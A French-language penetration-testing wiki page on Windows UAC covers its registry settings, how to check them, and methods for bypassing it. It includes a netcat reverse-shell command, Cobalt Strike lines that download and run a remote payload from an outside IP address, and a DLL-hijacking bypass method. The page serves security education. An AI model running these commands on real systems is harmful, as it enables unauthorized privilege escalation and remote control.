# UAC - Contrôle de Compte Utilisateur

{{#include ../../banners/hacktricks-training.md}}

## UAC

[Le Contrôle de Compte Utilisateur (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) est une fonctionnalité qui permet une **demande de consentement pour des activités élevées**. Les applications ont différents niveaux d'`intégrité`, et un programme avec un **niveau élevé** peut effectuer des tâches qui **pourraient potentiellement compromettre le système**. Lorsque l'UAC est activé, les applications et les tâches s'exécutent toujours **sous le contexte de sécurité d'un compte non administrateur** à moins qu'un administrateur n'autorise explicitement ces applications/tâches à avoir un accès de niveau administrateur au système pour s'exécuter. C'est une fonctionnalité de commodité qui protège les administrateurs des modifications non intentionnelles mais n'est pas considérée comme une frontière de sécurité.

Pour plus d'informations sur les niveaux d'intégrité :

{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Lorsque l'UAC est en place, un utilisateur administrateur reçoit 2 jetons : une clé d'utilisateur standard, pour effectuer des actions régulières au niveau régulier, et une avec les privilèges d'administrateur.

Cette [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) discute en profondeur du fonctionnement de l'UAC et inclut le processus de connexion, l'expérience utilisateur et l'architecture de l'UAC. Les administrateurs peuvent utiliser des politiques de sécurité pour configurer le fonctionnement de l'UAC spécifique à leur organisation au niveau local (en utilisant secpol.msc), ou configuré et déployé via des Objets de Politique de Groupe (GPO) dans un environnement de domaine Active Directory. Les différents paramètres sont discutés en détail [ici](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Il existe 10 paramètres de Politique de Groupe qui peuvent être définis pour l'UAC. Le tableau suivant fournit des détails supplémentaires :

| Paramètre de Politique de Groupe                                                                                                                                                                                                                                                                                                                                                           | Clé de Registre            | Paramètre par Défaut                                        |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [Contrôle de Compte Utilisateur : Mode d'Approbation Admin pour le compte Administrateur intégré](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Désactivé                                                   |
| [Contrôle de Compte Utilisateur : Autoriser les applications UIAccess à demander une élévation sans utiliser le bureau sécurisé](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Désactivé                                                   |
| [Contrôle de Compte Utilisateur : Comportement de l'invite d'élévation pour les administrateurs en Mode d'Approbation Admin](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Demander le consentement pour les binaires non-Windows     |
| [Contrôle de Compte Utilisateur : Comportement de l'invite d'élévation pour les utilisateurs standard](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Demander des identifiants sur le bureau sécurisé            |
| [Contrôle de Compte Utilisateur : Détecter les installations d'applications et demander une élévation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Activé (par défaut pour les foyers) Désactivé (par défaut pour les entreprises) |
| [Contrôle de Compte Utilisateur : Élever uniquement les exécutables qui sont signés et validés](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Désactivé                                                   |
| [Contrôle de Compte Utilisateur : Élever uniquement les applications UIAccess qui sont installées dans des emplacements sécurisés](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Activé                                                      |
| [Contrôle de Compte Utilisateur : Exécuter tous les administrateurs en Mode d'Approbation Admin](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Activé                                                      |
| [Contrôle de Compte Utilisateur : Passer au bureau sécurisé lors de la demande d'élévation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Activé                                                      |
| [Contrôle de Compte Utilisateur : Virtualiser les échecs d'écriture de fichiers et de registre vers des emplacements par utilisateur](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Activé                                                      |

### Théorie du Contournement de l'UAC

Certains programmes sont **auto-élévés automatiquement** si l'**utilisateur appartient** au **groupe administrateur**. Ces binaires ont à l'intérieur de leurs _**Manifests**_ l'option _**autoElevate**_ avec la valeur _**True**_. Le binaire doit également être **signé par Microsoft**.

Ensuite, pour **contourner** l'**UAC** (élever du **niveau** d'intégrité **moyen** **au niveau élevé**), certains attaquants utilisent ce type de binaires pour **exécuter du code arbitraire** car il sera exécuté à partir d'un **processus d'intégrité de niveau élevé**.

Vous pouvez **vérifier** le _**Manifest**_ d'un binaire en utilisant l'outil _**sigcheck.exe**_ de Sysinternals. Et vous pouvez **voir** le **niveau d'intégrité** des processus en utilisant _Process Explorer_ ou _Process Monitor_ (de Sysinternals).

### Vérifier l'UAC

Pour confirmer si l'UAC est activé, faites :
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
Si c'est **`1`**, alors UAC est **activé**, si c'est **`0`** ou s'il **n'existe pas**, alors UAC est **inactif**.

Ensuite, vérifiez **quel niveau** est configuré :
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
- Si **`0`**, alors, UAC ne demandera pas (comme **désactivé**)
- Si **`1`**, l'administrateur est **demandé pour le nom d'utilisateur et le mot de passe** pour exécuter le binaire avec des droits élevés (sur le Bureau Sécurisé)
- Si **`2`** (**Toujours me notifier**) UAC demandera toujours confirmation à l'administrateur lorsqu'il essaie d'exécuter quelque chose avec des privilèges élevés (sur le Bureau Sécurisé)
- Si **`3`**, comme `1` mais pas nécessaire sur le Bureau Sécurisé
- Si **`4`**, comme `2` mais pas nécessaire sur le Bureau Sécurisé
- si **`5`**(**par défaut**) il demandera à l'administrateur de confirmer pour exécuter des binaires non Windows avec des privilèges élevés

Ensuite, vous devez examiner la valeur de **`LocalAccountTokenFilterPolicy`**\
Si la valeur est **`0`**, alors, seul l'utilisateur **RID 500** (**Administrateur intégré**) est capable d'effectuer des **tâches d'administration sans UAC**, et si c'est `1`, **tous les comptes dans le groupe "Administrateurs"** peuvent le faire.

Et, enfin, examinez la valeur de la clé **`FilterAdministratorToken`**\
Si **`0`**(par défaut), le **compte Administrateur intégré peut** effectuer des tâches d'administration à distance et si **`1`**, le compte Administrateur intégré **ne peut pas** effectuer des tâches d'administration à distance, à moins que `LocalAccountTokenFilterPolicy` soit défini sur `1`.

#### Résumé

- Si `EnableLUA=0` ou **n'existe pas**, **pas de UAC pour personne**
- Si `EnableLua=1` et **`LocalAccountTokenFilterPolicy=1`, pas de UAC pour personne**
- Si `EnableLua=1` et **`LocalAccountTokenFilterPolicy=0` et `FilterAdministratorToken=0`, pas de UAC pour RID 500 (Administrateur intégré)**
- Si `EnableLua=1` et **`LocalAccountTokenFilterPolicy=0` et `FilterAdministratorToken=1`, UAC pour tout le monde**

Toutes ces informations peuvent être recueillies à l'aide du module **metasploit** : `post/windows/gather/win_privs`

Vous pouvez également vérifier les groupes de votre utilisateur et obtenir le niveau d'intégrité :
```
net user %username%
whoami /groups | findstr Level
```
## Contournement de l'UAC

> [!NOTE]
> Notez que si vous avez un accès graphique à la victime, le contournement de l'UAC est simple car vous pouvez simplement cliquer sur "Oui" lorsque l'invite UAC apparaît.

Le contournement de l'UAC est nécessaire dans la situation suivante : **l'UAC est activé, votre processus s'exécute dans un contexte d'intégrité moyen, et votre utilisateur appartient au groupe des administrateurs**.

Il est important de mentionner qu'il est **beaucoup plus difficile de contourner l'UAC s'il est au niveau de sécurité le plus élevé (Toujours) que s'il est à l'un des autres niveaux (Par défaut).**

### UAC désactivé

Si l'UAC est déjà désactivé (`ConsentPromptBehaviorAdmin` est **`0`**), vous pouvez **exécuter un shell inversé avec des privilèges d'administrateur** (niveau d'intégrité élevé) en utilisant quelque chose comme :
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### Contournement UAC avec duplication de jeton

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Très** Basique "contournement" UAC (accès complet au système de fichiers)

Si vous avez un shell avec un utilisateur qui fait partie du groupe Administrateurs, vous pouvez **monter le C$** partagé via SMB (système de fichiers) local dans un nouveau disque et vous aurez **accès à tout dans le système de fichiers** (même le dossier personnel de l'Administrateur).

> [!WARNING]
> **On dirait que ce truc ne fonctionne plus**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### Contournement de l'UAC avec Cobalt Strike

Les techniques de Cobalt Strike ne fonctionneront que si l'UAC n'est pas réglé au niveau de sécurité maximal.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** et **Metasploit** ont également plusieurs modules pour **contourner** le **UAC**.

### KRBUACBypass

Documentation et outil dans [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### Exploits de contournement UAC

[**UACME** ](https://github.com/hfiref0x/UACME)qui est une **compilation** de plusieurs exploits de contournement UAC. Notez que vous devrez **compiler UACME en utilisant visual studio ou msbuild**. La compilation créera plusieurs exécutables (comme `Source\Akagi\outout\x64\Debug\Akagi.exe`), vous devrez savoir **lequel vous avez besoin.**\
Vous devez **être prudent** car certains contournements **demanderont d'autres programmes** qui **alerteront** l'**utilisateur** que quelque chose se passe.

UACME a la **version de construction à partir de laquelle chaque technique a commencé à fonctionner**. Vous pouvez rechercher une technique affectant vos versions :
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Aussi, en utilisant [cette](https://en.wikipedia.org/wiki/Windows_10_version_history) page, vous obtenez la version de Windows `1607` à partir des versions de build.

#### Plus de contournements UAC

**Toutes** les techniques utilisées ici pour contourner l'AUC **nécessitent** un **shell interactif complet** avec la victime (un shell nc.exe classique ne suffit pas).

Vous pouvez obtenir cela en utilisant une session **meterpreter**. Migrez vers un **processus** qui a la valeur **Session** égale à **1** :

![](<../../images/image (863).png>)

(_explorer.exe_ devrait fonctionner)

### Contournement UAC avec GUI

Si vous avez accès à une **GUI, vous pouvez simplement accepter l'invite UAC** lorsque vous l'obtenez, vous n'avez vraiment pas besoin de contournement. Donc, obtenir l'accès à une GUI vous permettra de contourner l'UAC.

De plus, si vous obtenez une session GUI que quelqu'un utilisait (potentiellement via RDP), il y a **certains outils qui s'exécuteront en tant qu'administrateur** à partir desquels vous pourriez **exécuter** un **cmd** par exemple **en tant qu'admin** directement sans être à nouveau invité par l'UAC comme [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Cela pourrait être un peu plus **discret**.

### Contournement UAC bruyant par force brute

Si vous ne vous souciez pas d'être bruyant, vous pourriez toujours **exécuter quelque chose comme** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) qui **demande d'élever les permissions jusqu'à ce que l'utilisateur l'accepte**.

### Votre propre contournement - Méthodologie de contournement UAC de base

Si vous jetez un œil à **UACME**, vous remarquerez que **la plupart des contournements UAC abusent d'une vulnérabilité de détournement de DLL** (principalement en écrivant la DLL malveillante sur _C:\Windows\System32_). [Lisez ceci pour apprendre comment trouver une vulnérabilité de détournement de DLL](../windows-local-privilege-escalation/dll-hijacking/).

1. Trouvez un binaire qui **s'auto-élève** (vérifiez que lorsqu'il est exécuté, il s'exécute à un niveau d'intégrité élevé).
2. Avec procmon, trouvez des événements "**NOM NON TROUVÉ**" qui peuvent être vulnérables au **détournement de DLL**.
3. Vous aurez probablement besoin de **écrire** la DLL à l'intérieur de certains **chemins protégés** (comme C:\Windows\System32) où vous n'avez pas de permissions d'écriture. Vous pouvez contourner cela en utilisant :
   1. **wusa.exe** : Windows 7, 8 et 8.1. Cela permet d'extraire le contenu d'un fichier CAB à l'intérieur de chemins protégés (car cet outil est exécuté à partir d'un niveau d'intégrité élevé).
   2. **IFileOperation** : Windows 10.
4. Préparez un **script** pour copier votre DLL à l'intérieur du chemin protégé et exécuter le binaire vulnérable et auto-élévé.

### Une autre technique de contournement UAC

Consiste à surveiller si un **binaire auto-élévé** essaie de **lire** dans le **registre** le **nom/chemin** d'un **binaire** ou **commande** à exécuter (c'est plus intéressant si le binaire recherche cette information à l'intérieur du **HKCU**).

{{#include ../../banners/hacktricks-training.md}}
